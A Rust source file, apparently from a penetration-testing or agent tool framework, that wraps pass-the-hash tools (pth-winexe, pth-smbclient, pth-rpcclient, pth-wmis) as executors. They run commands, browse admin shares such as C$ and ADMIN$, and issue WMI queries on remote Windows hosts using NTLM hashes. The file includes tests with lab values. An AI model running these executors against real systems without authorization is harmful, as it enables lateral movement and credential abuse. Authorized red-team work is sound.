//! Pass-the-Hash tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Build a pth-style credential string: `domain/username%hash` or `username%hash`.
fn pth_cred_string(domain: Option<&str>, username: &str, hash: &str) -> String {
    match domain {
        Some(d) if !d.is_empty() => format!("{d}/{username}%{hash}"),
        _ => format!("{username}%{hash}"),
    }
}

/// Execute a command on a remote host via pth-winexe.
///
/// Required args: `target`, `username`, `hash`
/// Optional args: `domain`, `command`
pub async fn pth_winexe(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let hash = required_str(args, "hash")?;
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("cmd.exe /c whoami");

    let cred = pth_cred_string(domain, username, hash);

    CommandBuilder::new("pth-winexe")
        .flag("-U", &cred)
        .arg(format!("//{target}"))
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Access an SMB share on a remote host via pth-smbclient.
///
/// Required args: `target`, `username`, `hash`
/// Optional args: `domain`, `share`, `command`
pub async fn pth_smbclient(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let hash = required_str(args, "hash")?;
    let domain = optional_str(args, "domain");
    let share = optional_str(args, "share").unwrap_or("C$");
    let command = optional_str(args, "command").unwrap_or("dir");

    let cred = pth_cred_string(domain, username, hash);

    CommandBuilder::new("pth-smbclient")
        .arg(format!("//{target}/{share}"))
        .flag("-U", &cred)
        .flag("-c", command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute an RPC command on a remote host via pth-rpcclient.
///
/// Required args: `target`, `username`, `hash`
/// Optional args: `domain`, `command`
pub async fn pth_rpcclient(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let hash = required_str(args, "hash")?;
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("getusername");

    let cred = pth_cred_string(domain, username, hash);

    CommandBuilder::new("pth-rpcclient")
        .flag("-U", &cred)
        .arg(target)
        .flag("-c", command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a WMI query on a remote host via pth-wmis.
///
/// Required args: `target`, `username`, `hash`
/// Optional args: `domain`, `query`
pub async fn pth_wmic(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let hash = required_str(args, "hash")?;
    let domain = optional_str(args, "domain");
    let query = optional_str(args, "query").unwrap_or("SELECT * FROM Win32_OperatingSystem");

    let cred = pth_cred_string(domain, username, hash);

    CommandBuilder::new("pth-wmis")
        .flag("-U", &cred)
        .arg(format!("//{target}"))
        .arg(query)
        .timeout_secs(120)
        .execute()
        .await
}

#[cfg(test)]
mod tests {
    use super::pth_cred_string;
    use crate::args::{optional_str, required_str};
    use serde_json::json;

    // --- pth_cred_string ---

    #[test]
    fn cred_string_with_domain() {
        let result = pth_cred_string(Some("CONTOSO"), "admin", "aabbccdd");
        assert_eq!(result, "CONTOSO/admin%aabbccdd");
    }

    #[test]
    fn cred_string_without_domain() {
        let result = pth_cred_string(None, "admin", "aabbccdd");
        assert_eq!(result, "admin%aabbccdd");
    }

    #[test]
    fn cred_string_empty_domain() {
        let result = pth_cred_string(Some(""), "admin", "aabbccdd");
        assert_eq!(result, "admin%aabbccdd");
    }

    // --- pth_winexe ---

    #[test]
    fn pth_winexe_requires_target() {
        let args = json!({"username": "admin", "hash": "aabbccdd"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn pth_winexe_requires_username() {
        let args = json!({"target": "192.168.58.1", "hash": "aabbccdd"});
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn pth_winexe_requires_hash() {
        let args = json!({"target": "192.168.58.1", "username": "admin"});
        assert!(required_str(&args, "hash").is_err());
    }

    #[test]
    fn pth_winexe_default_command() {
        let args = json!({"target": "192.168.58.1", "username": "admin", "hash": "aa"});
        let command = optional_str(&args, "command").unwrap_or("cmd.exe /c whoami");
        assert_eq!(command, "cmd.exe /c whoami");
    }

    #[test]
    fn pth_winexe_target_format() {
        let target = "192.168.58.1";
        assert_eq!(format!("//{target}"), "//192.168.58.1");
    }

    // --- pth_smbclient ---

    #[test]
    fn pth_smbclient_default_share() {
        let args = json!({"target": "192.168.58.1", "username": "admin", "hash": "aa"});
        let share = optional_str(&args, "share").unwrap_or("C$");
        assert_eq!(share, "C$");
    }

    #[test]
    fn pth_smbclient_custom_share() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "hash": "aa",
            "share": "ADMIN$"
        });
        let share = optional_str(&args, "share").unwrap_or("C$");
        assert_eq!(share, "ADMIN$");
    }

    #[test]
    fn pth_smbclient_default_command() {
        let args = json!({"target": "192.168.58.1", "username": "admin", "hash": "aa"});
        let command = optional_str(&args, "command").unwrap_or("dir");
        assert_eq!(command, "dir");
    }

    #[test]
    fn pth_smbclient_target_share_format() {
        let target = "192.168.58.1";
        let share = "C$";
        assert_eq!(format!("//{target}/{share}"), "//192.168.58.1/C$");
    }

    // --- pth_rpcclient ---

    #[test]
    fn pth_rpcclient_default_command() {
        let args = json!({"target": "192.168.58.1", "username": "admin", "hash": "aa"});
        let command = optional_str(&args, "command").unwrap_or("getusername");
        assert_eq!(command, "getusername");
    }

    // --- pth_wmic ---

    #[test]
    fn pth_wmic_default_query() {
        let args = json!({"target": "192.168.58.1", "username": "admin", "hash": "aa"});
        let query = optional_str(&args, "query").unwrap_or("SELECT * FROM Win32_OperatingSystem");
        assert_eq!(query, "SELECT * FROM Win32_OperatingSystem");
    }

    #[test]
    fn pth_wmic_custom_query() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "hash": "aa",
            "query": "SELECT Name FROM Win32_Process"
        });
        let query = optional_str(&args, "query").unwrap_or("SELECT * FROM Win32_OperatingSystem");
        assert_eq!(query, "SELECT Name FROM Win32_Process");
    }

    #[test]
    fn pth_wmic_target_format() {
        let target = "dc01.contoso.local";
        assert_eq!(format!("//{target}"), "//dc01.contoso.local");
    }

    #[test]
    fn pth_cred_string_in_context() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "hash": "aad3b435:aabbccdd",
            "domain": "CONTOSO"
        });
        let username = required_str(&args, "username").unwrap();
        let hash = required_str(&args, "hash").unwrap();
        let domain = optional_str(&args, "domain");
        let cred = pth_cred_string(domain, username, hash);
        assert_eq!(cred, "CONTOSO/admin%aad3b435:aabbccdd");
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn pth_winexe_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "hash": "aabbccdd", "domain": "CONTOSO"
        });
        assert!(super::pth_winexe(&args).await.is_ok());
    }

    #[tokio::test]
    async fn pth_smbclient_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "hash": "aabbccdd"
        });
        assert!(super::pth_smbclient(&args).await.is_ok());
    }

    #[tokio::test]
    async fn pth_rpcclient_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "hash": "aabbccdd"
        });
        assert!(super::pth_rpcclient(&args).await.is_ok());
    }

    #[tokio::test]
    async fn pth_wmic_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "hash": "aabbccdd"
        });
        assert!(super::pth_wmic(&args).await.is_ok());
    }
}
